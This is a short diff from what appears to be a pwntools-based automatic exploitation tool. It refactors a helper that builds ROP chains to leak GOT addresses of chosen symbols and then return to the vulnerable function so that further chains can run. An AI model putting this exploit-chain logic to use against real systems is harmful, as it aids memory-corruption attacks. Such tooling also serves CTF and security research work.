@@ -34,14 +34,8 @@ def leak_helper(
     for symbol in symbols:
         rop = leaker(rop, state.elf.got[symbol])
 
-    # ensure that call to vuln_function is stack-aligned
-    # by aligning it minus one word
-    # TODO: refactor this for reusability for all rop function calls
-    arutil.align_rop(
-        rop,
-        align(constants.STACK_ALIGNMENT, len(rop.chain())) // context.bytes - 1,
-    )
-    rop.call(state.vuln_function)  # return back so we can execute more chains later
+    # return back so we can execute more chains later
+    arutil.align_call(rop, state.vuln_function, [])
     log.info(rop.dump())
 
     state.target.clean(constants.CLEAN_TIME)
